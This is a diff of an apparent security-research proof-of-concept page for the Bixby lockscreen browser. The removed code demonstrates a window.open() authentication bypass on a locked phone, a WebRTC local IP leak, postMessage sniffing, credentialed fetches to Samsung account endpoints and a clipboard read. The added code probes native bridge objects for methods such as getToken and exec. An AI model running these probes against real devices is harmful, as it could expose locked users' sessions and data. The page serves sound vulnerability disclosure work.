@@ -15,62 +15,28 @@
     background: #2563eb; color: white; text-align: left;
   }
   button:active { background: #1d4ed8; }
-  input[type=text] {
-    width: 100%; box-sizing: border-box; padding: 10px; border-radius: 6px;
-    border: 1px solid #444; background: #000; color: #eee; font-size: 14px; margin-bottom: 8px;
-  }
   .log { margin-top: 16px; padding: 10px; border-radius: 6px; background: #222;
          font-size: 12px; white-space: pre-wrap; word-break: break-all; max-height: 320px; overflow-y: auto; }
-  .box { margin: 10px 0; padding: 10px; background: #1a1a1a; border-radius: 8px; }
 </style>
 </head>
 <body>
-<h1>Bixby Lockscreen Browser — Access Control PoC</h1>
+<h1>Bixby Lockscreen Browser — Native JS Bridge Probe</h1>
 <p class="note">
-  This page reproduces two findings in the Bixby lockscreen search browser (Galaxy S25 Ultra):
-  (1) <code>window.open()</code> bypasses the authentication prompt that direct URL entry enforces,
-  allowing unrestricted navigation while the device is locked, and (2) a WebRTC ICE candidate leak
-  exposes the device's real local IP address with no permission prompt while locked.
   Reach this page via a Bixby search result while the device is locked (typing this URL directly
-  into the Bixby search bar will trigger an auth prompt and does not reproduce the bug).
+  into the Bixby search bar triggers an auth prompt and does not reproduce the delivery bug — see
+  the companion lockscreen-bypass report for that part, not duplicated here).
 </p>
 
-<h2>1. window.open() auth bypass</h2>
-<button onclick="testWindowOpen()">Open example.com via window.open()</button>
-
-<div class="box">
-  <div style="font-size: 13px; color: #93c5fd; margin-bottom: 6px;">
-    Custom URL (e.g. to test session persistence for an account logged into Bixby's own browser)
-  </div>
-  <input id="customUrl" type="text" placeholder="e.g. https://mail.google.com">
-  <button onclick="testCustomWindowOpen()">Open via window.open()</button>
-</div>
-
-<h2>2. WebRTC local IP leak</h2>
-<button onclick="testWebRTCLeak()">Run RTCPeerConnection ICE gathering</button>
-
-<h2>3. JS bridge / native interface enumeration</h2>
-<p class="note">Looks for any non-standard global (e.g. an addJavascriptInterface-style native
-bridge object) exposed to page JS in this WebView context.</p>
+<h2>Native JS bridge (needs testing — AndroidBridge/android found, capability unknown)</h2>
+<p class="note">Window global enumeration already found two non-standard globals —
+<code>AndroidBridge</code> and <code>android</code> — consistent with an
+addJavascriptInterface()-style native bridge. What they expose is not yet known. The deep-probe
+buttons are read-only reflection only (getOwnPropertyNames, for...in, prototype inspection,
+JSON.stringify, typeof-only existence checks against common bridge method names) — nothing is
+invoked.</p>
 <button onclick="testEnumerateGlobals()">Enumerate window globals</button>
-
-<h2>4. postMessage sniffing</h2>
-<p class="note">Passive listener, active from page load — logs any window.postMessage the native
-side or another frame sends into this page's context (e.g. while navigating via window.open()).</p>
-
-<h2>5. Cross-origin fetch / CORS probe</h2>
-<p class="note">Tests whether a credentialed fetch() to a Samsung endpoint you specify returns a
-CORS-readable response from within the locked WebView's cookie jar. Enter a URL you know is
-relevant to your own Samsung account/session (e.g. an account.samsung.com API you've observed
-in your own traffic) — this does not guess or scan endpoints on its own.</p>
-<div class="box">
-  <input id="fetchUrl" type="text" placeholder="e.g. https://account.samsung.com/...">
-  <button onclick="testFetch()">fetch() with credentials: 'include'</button>
-  <button onclick="testFetchNoCors()">fetch() with mode: 'no-cors' (reachability only)</button>
-</div>
-
-<h2>6. Clipboard read (bonus)</h2>
-<button onclick="testClipboardRead()">navigator.clipboard.readText()</button>
+<button onclick="testProbeBridge('AndroidBridge')">Deep-probe window.AndroidBridge (read-only)</button>
+<button onclick="testProbeBridge('android')">Deep-probe window.android (read-only)</button>
 
 <div class="log" id="log">Select a test above. Results are logged below (newest first).</div>
 
@@ -81,14 +47,6 @@ function log(msg) {
   el.textContent = "[" + ts + "] " + msg + "\n\n" + el.textContent;
 }
 
-// Test 4: passive postMessage listener, active immediately on page load
-window.addEventListener("message", function(e) {
-  let dataStr;
-  try { dataStr = JSON.stringify(e.data); } catch (err) { dataStr = String(e.data); }
-  log("postMessage RECEIVED — origin=" + e.origin + " source=" + (e.source ? "present" : "null") + " data=" + dataStr);
-});
-log("postMessage listener armed at page load — will log anything received.");
-
 function testEnumerateGlobals() {
   const keys = Object.getOwnPropertyNames(window).sort();
   const suspicious = keys.filter(k => /android|bixby|native|bridge|jsinterface|webview|samsung|jsi\b|inject/i.test(k));
@@ -97,66 +55,55 @@ function testEnumerateGlobals() {
       "\nFull list (first 250, review manually for anything unexpected):\n" + keys.slice(0, 250).join(", "));
 }
 
-async function testFetch() {
-  const url = document.getElementById("fetchUrl").value.trim();
-  if (!url) return log("Enter a URL first");
+// Read-only reflection only — does NOT call any method on the bridge object,
+// only inspects what's visible via standard JS reflection APIs. Calling an
+// unknown native method blindly could have side effects, so that is
+// deliberately NOT done here; this only reports candidate method NAMES for
+// manual review before anything is ever invoked.
+function testProbeBridge(name) {
+  const obj = window[name];
+  if (obj === undefined) return log(name + ": undefined — not present in this context");
+  if (obj === null) return log(name + ": null");
+
+  const lines = [name + " exists. typeof=" + typeof obj];
+
+  try { lines.push("String(obj)=" + String(obj)); } catch (e) { lines.push("String(obj) threw: " + e); }
+
   try {
-    const res = await fetch(url, { credentials: "include", mode: "cors" });
-    let bodyPreview;
-    try { bodyPreview = (await res.text()).slice(0, 400); }
-    catch (e) { bodyPreview = "[body unreadable: " + e + "]"; }
-    log("fetch(" + url + ", cors) status=" + res.status + " type=" + res.type +
-        " ok=" + res.ok + "\nbody preview: " + bodyPreview);
-  } catch (e) {
-    log("fetch(" + url + ", cors) BLOCKED or errored: " + e);
-  }
-}
+    const ownProps = Object.getOwnPropertyNames(obj);
+    lines.push("Object.getOwnPropertyNames: [" + ownProps.join(", ") + "] (count=" + ownProps.length + ")");
+  } catch (e) { lines.push("getOwnPropertyNames threw: " + e); }
 
-async function testFetchNoCors() {
-  const url = document.getElementById("fetchUrl").value.trim();
-  if (!url) return log("Enter a URL first");
   try {
-    const res = await fetch(url, { credentials: "include", mode: "no-cors" });
-    log("fetch(" + url + ", no-cors) completed — type=" + res.type +
-        " (opaque response: request WAS sent with credentials, but body/status not readable by JS — this only proves reachability, not exfiltration)");
-  } catch (e) {
-    log("fetch(" + url + ", no-cors) errored: " + e);
-  }
-}
+    const forInProps = [];
+    for (const k in obj) forInProps.push(k);
+    lines.push("for...in enumeration: [" + forInProps.join(", ") + "] (count=" + forInProps.length + ")");
+  } catch (e) { lines.push("for...in threw: " + e); }
 
-async function testClipboardRead() {
   try {
-    const text = await navigator.clipboard.readText();
-    log("navigator.clipboard.readText() SUCCEEDED: " + JSON.stringify(text));
-  } catch (e) {
-    log("navigator.clipboard.readText() blocked/errored: " + e);
-  }
-}
+    const proto = Object.getPrototypeOf(obj);
+    lines.push("prototype: " + (proto ? (proto.constructor ? proto.constructor.name : String(proto)) : "null"));
+    if (proto) {
+      const protoProps = Object.getOwnPropertyNames(proto);
+      lines.push("prototype own props: [" + protoProps.join(", ") + "]");
+    }
+  } catch (e) { lines.push("getPrototypeOf threw: " + e); }
 
-function testWindowOpen() {
-  const w = window.open("https://example.com/lockscreen-window-open-test", "_blank");
-  log("window.open(example.com) result: " + (w ? "window handle returned — navigated with NO auth prompt" : "null / blocked"));
-}
+  try { lines.push("JSON.stringify: " + JSON.stringify(obj)); }
+  catch (e) { lines.push("JSON.stringify threw: " + e); }
 
-function testCustomWindowOpen() {
-  const url = document.getElementById("customUrl").value.trim();
-  if (!url) return log("Enter a URL above first");
-  const w = window.open(url, "_blank");
-  log("window.open(" + url + ") result: " + (w ? "window handle returned" : "null / blocked") +
-      " — check whether the opened page loaded in an already-authenticated state");
-}
+  // Probe a small set of common addJavascriptInterface-style method NAMES
+  // (existence check only via typeof — never invoked) often seen in native
+  // bridges: postMessage/send-style, data getters, and lifecycle hooks.
+  const candidateNames = [
+    "postMessage", "send", "sendMessage", "call", "invoke", "getData", "getToken",
+    "getUserInfo", "getDeviceId", "getSessionId", "getCookie", "getUrl", "close",
+    "showToast", "onMessage", "receive", "exec", "run", "eval"
+  ];
+  const present = candidateNames.filter(n => typeof obj[n] !== "undefined");
+  lines.push("Candidate method names present (typeof !== undefined): [" + present.join(", ") + "]");
 
-function testWebRTCLeak() {
-  try {
-    const pc = new RTCPeerConnection({ iceServers: [] });
-    pc.createDataChannel("");
-    pc.createOffer().then(o => pc.setLocalDescription(o));
-    pc.onicecandidate = e => {
-      if (e.candidate) log("ICE candidate (leaked local address): " + e.candidate.candidate);
-      else log("ICE gathering complete, no more candidates");
-    };
-    setTimeout(() => { if (pc.iceGatheringState !== "complete") log("WebRTC: timed out, state=" + pc.iceGatheringState); }, 5000);
-  } catch (e) { log("WebRTC error: " + e); }
+  log(lines.join("\n"));
 }
 </script>
 </body>
